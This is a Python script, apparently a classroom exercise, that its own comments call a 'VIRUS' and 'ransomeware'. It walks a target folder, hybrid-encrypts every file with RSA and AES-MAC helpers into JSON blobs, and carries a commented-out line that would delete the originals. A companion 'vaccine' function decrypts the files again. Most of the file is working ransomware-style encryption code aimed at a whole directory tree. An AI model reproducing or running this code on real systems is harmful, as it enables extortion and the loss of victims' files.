# Import methods from other files 
from fileEncryptMAC import MyencryptMAC, MydecryptMAC, MyFileEncryptMAC, MyFileDecryptMAC
from fileEncryptRSA import MyRSAencrypt, MyRSAdecrypt
# Import needed cryptogrpahy 
import os
import json, base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, hmac, padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.padding import OAEP, MGF1
from cryptography.hazmat.primitives.asymmetric.padding import MGF1 as uno
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import load_ssh_public_key
from pathlib import Path #used to get file ext

'''
Making a VIRUS that infect and encrypt a certain folder
'''

# This is the file where the virus will infect
# Making this path(tester folder) the current working directory
priv_key = "/Users/Phuc Nguyen/Desktop/FinalTesting/SHREKISLOVESHREKISLIFE555/privateKey.pem"

dir_path = '/Users/Phuc Nguyen/Desktop/Testing'
pub_key = "/Users/Phuc Nguyen/Desktop/FinalTesting/SHREKISLOVESHREKISLIFE555/publicKey.pem"
#os.chdir(dir_path)
#cwd = os.getcwd()
#print("Current directory:" + cwd)

def infection(dir_path, pub_key):
    for root, dirs, files in os.walk(dir_path):
        for filename in files:
            if "ransomeware.py" not in files and "public.pem" not in files and "private.pem" not in files: 
                #print("Encrypting " + filename + "...")
                # change directory to root in order to start from root and acess every folder inside the path
                #os.chdir(root)
                # join the path of file with root to loop through every folder 
                file_path = root + "/"+filename
                # Encryption method 
                (RSACipher, C, IV, ext, tag) = MyRSAencrypt(file_path, pub_key )
                
                fileName=os.path.splitext(file_path)[0] +".json"
        
                # Encoding using base 64 and decode with ascii and store it in a dictionary to dump it and write into ecrypted file 
                data = {'RSACipher':base64.b64encode(RSACipher).decode('ascii'),
                          'C':base64.b64encode(C).decode('ascii'),
                          'IV':base64.b64encode(IV).decode('ascii'),
                          'tag':base64.b64encode(tag).decode('ascii'),
                          'ext':ext } #make dict for json

                # writing the data to encrypted file 
                with open(fileName, 'w') as outfile: #Writes to json 
                    outfile.write(json.dumps(data)) # write the dumped dictionary to file 
                    outfile.close()
                    #os.remove(file_path) # remove all the file after encrypting it 

def vaccine(dir_path, priv_key):
    for root, dirs, files in os.walk(dir_path):
        for filename in files:
            if filename.endswith(".json") and not filename.startswith('.'):
                jsonPath = root + "/" + filename
                # Reading the .JSON file 
                with open(jsonPath, 'r') as file:
                    json_data = file.read()
                # load the data (RSACipher, ...) from the file    
                json_obj = json.loads(json_data)
                # Decoding each object with base 64 and then encode with ascii ( opposite with virus)
                RSACipher   = base64.b64decode(json_obj["RSACipher"].encode('ascii'))       
                C = base64.b64decode(json_obj["C"].encode('ascii')) 
                tag = base64.b64decode(json_obj["tag"].encode('ascii')) 
                IV  = base64.b64decode(json_obj["IV"].encode('ascii')) 
                ext = json_obj["ext"]

                # Get rid of".json" file so we can add the original extension later 
                #new_path =filename.replace('.json','')
             
                # Add the original extension 
                #name = new_path + ext
                # decrypting the file 
                plain_text = MyRSAdecrypt (filename,RSACipher, C, IV, ext, priv_key, tag)
                name = os.path.splitext(root+"/"+filename)[0] + ext
                # Write the original message into the original file with original extension 
                with open(name, 'wb') as outfile: #Writes to json
                    outfile.write(plain_text)
                    outfile.close()
                    os.remove(jsonPath)
# testing
#infection(dir_path, pub_key)
vaccine(dir_path,priv_key)
